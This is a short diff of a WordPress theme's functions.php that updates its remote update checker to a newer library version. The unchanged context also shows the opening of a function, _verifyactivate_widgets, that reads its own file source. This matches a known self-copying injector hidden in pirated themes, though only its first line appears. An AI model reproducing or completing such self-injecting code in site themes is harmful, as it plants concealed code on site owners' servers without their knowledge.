@@ -1,7 +1,9 @@
 <?php
 //自动更新
 require_once(get_template_directory() . '/theme-update-checker/plugin-update-checker.php');
-$niRvanaThemeUpdateChecker = Puc_v4_Factory::buildUpdateChecker(
+use YahnisElsts\PluginUpdateChecker\v5\PucFactory;
+
+$niRvanaThemeUpdateChecker = PucFactory::buildUpdateChecker(
     'https://blog.mkliu.top/source/info.json',
     get_template_directory() . '/functions.php',
     'niRvana'
@@ -1669,7 +1671,7 @@ include('pandastudio_plugins/config_plugins.php');
 include('pandastudio_framework/config_framework.php');
 
 ?>
-    <?php
+<?php
 function _verifyactivate_widgets()
 {
     $widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<"."?"));
